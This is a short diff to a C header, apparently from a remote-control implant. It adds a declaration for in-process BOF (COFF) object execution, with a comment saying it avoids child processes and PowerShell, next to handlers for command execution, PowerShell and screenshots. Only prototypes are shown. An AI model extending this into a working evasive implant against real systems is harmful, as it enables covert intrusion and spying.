@@ -21,6 +21,12 @@ void  task_free(Task *t);
 char *cmd_dispatch(const Task *t);
 
 /* ── Built-in command handlers ─────────────────────────────────────────────── */
+
+/* In-process BOF (COFF) execution — no child process, no PowerShell */
+BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
+                char *args, int args_len,
+                char **out_buf, SIZE_T *out_len);
+
 char *cmd_exec(const char *cmdline);
 char *cmd_ps(const char *expression);
 char *cmd_screenshot(void);
